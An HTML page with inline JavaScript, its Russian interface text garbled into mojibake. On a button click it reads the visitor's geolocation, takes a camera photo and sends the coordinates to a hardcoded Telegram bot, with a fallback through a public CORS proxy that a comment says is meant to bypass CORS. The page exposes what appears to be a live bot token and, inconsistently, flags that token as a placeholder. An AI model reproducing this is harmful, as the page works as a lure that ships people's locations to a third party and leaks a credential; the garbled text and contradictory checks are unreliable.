<!DOCTYPE html>
<html>
<head>
    <title>Telegram Send</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial;
            padding: 20px;
            text-align: center;
            background: #0088cc;
            color: white;
            min-height: 100vh;
            margin: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: white;
            color: #333;
            padding: 30px;
            border-radius: 20px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }
        button {
            background: #0088cc;
            color: white;
            border: none;
            padding: 20px 40px;
            font-size: 20px;
            border-radius: 10px;
            cursor: pointer;
            margin: 20px 0;
            width: 100%;
            font-weight: bold;
        }
        #status {
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
            display: none;
        }
        .good {
            background: #d4edda;
            color: #155724;
        }
        .bad {
            background: #f8d7da;
            color: #721c24;
        }
        img {
            max-width: 100%;
            border-radius: 10px;
            margin-top: 15px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üì∏ –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram</h1>
        <p>–ù–∞–∂–º–∏ ‚Üí —Ñ–æ—Ç–æ + –≥–µ–æ ‚Üí Telegram</p>
        
        <button onclick="sendToTelegram()">
            üì∏ –û–¢–ü–†–ê–í–ò–¢–¨
        </button>
        
        <div id="status"></div>
        <img id="preview" alt="–§–æ—Ç–æ">
        
        <p style="color: #666; font-size: 14px; margin-top: 20px;">
            –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –ø—Ä—è–º–æ–µ API Telegram
        </p>
    </div>

    <script>
    // ‚ö†Ô∏è –í–°–¢–ê–í–¨ –°–í–û–ô –¢–û–ö–ï–ù –ò CHAT ID –ó–î–ï–°–¨! ‚ö†Ô∏è
    const BOT_TOKEN = "7752183433:AAFy_IrScRXS2d1gqto7uk4nFUO0ISE11Cg";
    const CHAT_ID = "7931089642";
    
    async function sendToTelegram() {
        const btn = document.querySelector('button');
        const status = document.getElementById('status');
        const preview = document.getElementById('preview');
        
        btn.disabled = true;
        btn.textContent = '‚è≥...';
        status.style.display = 'none';
        preview.style.display = 'none';
        
        try {
            // 1. –ü–æ–ª—É—á–∞–µ–º –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é
            status.textContent = 'üìç –ü–æ–ª—É—á–∞–µ–º –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ...';
            status.className = 'good';
            status.style.display = 'block';
            
            const location = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(
                    pos => resolve({
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude
                    }),
                    () => reject(new Error('–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏'))
                );
            });
            
            // 2. –î–µ–ª–∞–µ–º —Ñ–æ—Ç–æ
            status.textContent = 'üì∏ –î–µ–ª–∞–µ–º —Ñ–æ—Ç–æ...';
            
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'environment' }
            });
            
            const video = document.createElement('video');
            video.srcObject = stream;
            
            await new Promise(resolve => {
                video.onloadedmetadata = () => {
                    video.play();
                    resolve();
                };
            });
            
            await new Promise(resolve => setTimeout(resolve, 800));
            
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            
            stream.getTracks().forEach(track => track.stop());
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø—Ä–µ–≤—å—é
            preview.src = canvas.toDataURL('image/jpeg');
            preview.style.display = 'block';
            
            // 3. –ü—Ä–æ–±—É–µ–º –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–∞–ø—Ä—è–º—É—é –≤ Telegram
            status.textContent = 'üì§ –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram...';
            
            // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
            const message = `üì∏ –ù–æ–≤–æ–µ —Ñ–æ—Ç–æ\n\nüìç –ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã:\n–®–∏—Ä–æ—Ç–∞: ${location.lat}\n–î–æ–ª–≥–æ—Ç–∞: ${location.lon}\n\nüó∫Ô∏è –ö–∞—Ä—Ç–∞: https://maps.google.com?q=${location.lat},${location.lon}`;
            
            // –ü—Ä–æ–±—É–µ–º –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Ç–µ–∫—Å—Ç
            try {
                const response = await fetch(
                    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
                    {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            // –ü—Ä–æ–±—É–µ–º –æ–±–æ–π—Ç–∏ CORS
                            'Accept': 'application/json',
                            'Mode': 'cors'
                        },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: message,
                            parse_mode: 'HTML'
                        })
                    }
                );
                
                if (response.ok) {
                    const result = await response.json();
                    if (result.ok) {
                        status.textContent = '‚úÖ –£—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ!';
                        status.className = 'good';
                    } else {
                        throw new Error(result.description || '–û—à–∏–±–∫–∞ Telegram');
                    }
                } else {
                    // –ï—Å–ª–∏ CORS –±–ª–æ–∫–∏—Ä—É–µ—Ç, –ø—Ä–æ–±—É–µ–º —á–µ—Ä–µ–∑ –ø—Ä–æ–∫—Å–∏
                    await sendViaProxy(message, canvas);
                }
                
            } catch (telegramError) {
                // –ü—Ä–æ–±—É–µ–º –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –º–µ—Ç–æ–¥
                status.textContent = 'üîÑ –ü—Ä–æ–±—É–µ–º –¥—Ä—É–≥–æ–π —Å–ø–æ—Å–æ–±...';
                await sendAlternative(location, canvas);
            }
            
        } catch (error) {
            status.textContent = '‚ùå –û—à–∏–±–∫–∞: ' + error.message;
            status.className = 'bad';
            status.style.display = 'block';
            console.error(error);
        } finally {
            btn.disabled = false;
            btn.textContent = 'üì∏ –û–¢–ü–†–ê–í–ò–¢–¨';
        }
    }
    
    // –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –º–µ—Ç–æ–¥ —á–µ—Ä–µ–∑ CORS –ø—Ä–æ–∫—Å–∏
    async function sendViaProxy(message, canvas) {
        const status = document.getElementById('status');
        
        // –ò—Å–ø–æ–ª—å–∑—É–µ–º CORS –ø—Ä–æ–∫—Å–∏
        const proxyUrl = 'https://corsproxy.io/?';
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        try {
            const response = await fetch(proxyUrl + encodeURIComponent(telegramUrl), {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            
            const result = await response.json();
            
            if (result.ok) {
                status.textContent = '‚úÖ –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ —á–µ—Ä–µ–∑ –ø—Ä–æ–∫—Å–∏!';
                status.className = 'good';
            } else {
                throw new Error('–ü—Ä–æ–∫—Å–∏ –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª');
            }
        } catch (proxyError) {
            throw proxyError;
        }
    }
    
    // –ï—â–µ –æ–¥–∏–Ω –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –º–µ—Ç–æ–¥
    async function sendAlternative(location, canvas) {
        const status = document.getElementById('status');
        
        // –°–æ—Ö—Ä–∞–Ω—è–µ–º –¥–∞–Ω–Ω—ã–µ –≤ localStorage
        const data = {
            lat: location.lat,
            lon: location.lon,
            photo: canvas.toDataURL('image/jpeg'),
            time: new Date().toISOString(),
            token: BOT_TOKEN.substring(0, 10) + '...', // –¥–ª—è –¥–µ–º–æ
            chatId: CHAT_ID
        };
        
        localStorage.setItem('telegram_data', JSON.stringify(data));
        
        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é —á—Ç–æ –¥–µ–ª–∞—Ç—å
        const message = `üìç –ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã: ${location.lat}, ${location.lon}`;
        
        // –û—Ç–∫—Ä—ã–≤–∞–µ–º Telegram —Å –≥–æ—Ç–æ–≤—ã–º —Å–æ–æ–±—â–µ–Ω–∏–µ–º
        const telegramShareUrl = `https://t.me/share/url?url=${encodeURIComponent('–ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã –ø–æ–ª—É—á–µ–Ω—ã')}&text=${encodeURIComponent(message)}`;
        
        status.innerHTML = `
            ‚úÖ –î–∞–Ω–Ω—ã–µ –≥–æ—Ç–æ–≤—ã!<br>
            üìç –ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã: ${location.lat}, ${location.lon}<br>
            üì∏ –§–æ—Ç–æ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–æ<br><br>
            <a href="${telegramShareUrl}" target="_blank" style="color: #0088cc; text-decoration: underline;">
                üì© –ù–∞–∂–º–∏ —á—Ç–æ–±—ã –æ—Ç–∫—Ä—ã—Ç—å Telegram
            </a>
        `;
        status.className = 'good';
    }
    
    // –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞—Å—Ç—Ä–æ–π–∫–∏
    document.addEventListener('DOMContentLoaded', () => {
        const status = document.getElementById('status');
        
        if (!BOT_TOKEN || BOT_TOKEN.includes('7752183433:AAFy_IrScRXS2d1gqto7uk4nFUO0ISE11Cg')) {
            status.textContent = '‚ö†Ô∏è –í—Å—Ç–∞–≤—å —Å–≤–æ–π BOT_TOKEN –≤ –∫–æ–¥!';
            status.className = 'bad';
            status.style.display = 'block';
        }
        
        if (!CHAT_ID || CHAT_ID === '7931089642') {
            status.textContent = '‚ö†Ô∏è –í—Å—Ç–∞–≤—å —Å–≤–æ–π CHAT_ID –≤ –∫–æ–¥!';
            status.className = 'bad';
            status.style.display = 'block';
        }
    });
    </script>
</body>
</html>
